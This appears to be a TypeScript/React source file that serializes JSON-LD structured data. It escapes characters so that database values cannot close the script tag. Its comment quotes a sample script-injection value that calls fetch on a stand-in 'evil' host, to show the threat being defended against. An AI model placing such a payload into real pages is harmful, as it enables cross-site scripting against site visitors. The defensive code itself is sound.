/**
 * The single way this app emits JSON-LD.
 *
 * `JSON.stringify` does not escape `<`, so any value that reaches structured
 * data from the database - a product name, a menu item, an admin-authored
 * description - could close the script element and inject markup:
 *
 *     name: 'Latte </script><script>fetch("//evil")</script>'
 *
 * Escaping the three characters that can start a tag or an entity (plus the
 * two line separators that break JSON in a script context) makes that
 * impossible while leaving the JSON semantically identical: `<` parses
 * back to `<`.
 */

export function serializeJsonLd(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}

export function JsonLd({ data }: { data: unknown }) {
  return (
    <script
      type="application/ld+json"
      dangerouslySetInnerHTML={{ __html: serializeJsonLd(data) }}
    />
  );
}
